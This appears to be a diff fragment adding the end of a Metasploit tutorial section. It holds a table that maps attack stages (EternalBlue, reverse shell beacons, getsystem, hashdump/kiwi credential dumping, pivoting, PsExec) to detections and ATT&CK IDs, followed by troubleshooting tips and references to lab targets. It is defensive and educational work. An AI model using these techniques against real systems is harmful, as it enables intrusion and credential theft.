+| SMB exploit (EternalBlue) | MS17-010 IDS sig; alert on SMBv1; patch | T1210 |
+| Reverse_tcp beacon | Egress filtering; new-outbound detection | T1071 |
+| migrate / getsystem | Process-injection + token EDR (Sysmon 8/10) | T1055 |
+| hashdump / kiwi | LSASS-access alerts; Credential Guard | T1003 |
+| Pivoting / autoroute | Segmentation; east-west flow monitoring | T1090 |
+| PsExec lateral move | Service-creation + 4624/4672 logon alerts | T1021 |
+
+## 5.5 Troubleshooting
+
+- **No session** — wrong `LHOST` NIC, firewalled `LPORT`, arch mismatch, or AV killed the stage.
+- **`check` indeterminate** — verify out-of-band (Nmap NSE), don't fire blind.
+- **DB disconnected** — `sudo msfdb init`, `db_status`, `db_rebuild_cache`.
+- **Empty search** — `db_rebuild_cache`; re-check module path.
+- **Pivot scan fails** — route not added, session dead, or target genuinely unreachable.
+
+## 5.6 References
+
+- Metasploit Docs — https://docs.metasploit.com/
+- Database support — https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html
+- Managing sessions — https://docs.metasploit.com/docs/using-metasploit/basics/managing-sessions.html
+- Using a module appropriately — https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html
+- Source — https://github.com/rapid7/metasploit-framework
+- MITRE ATT&CK — https://attack.mitre.org/
+- TryHackMe *Blue* — https://tryhackme.com/room/blue
+- Metasploitable 2 — https://docs.rapid7.com/metasploit/metasploitable-2/
 
 ---
 
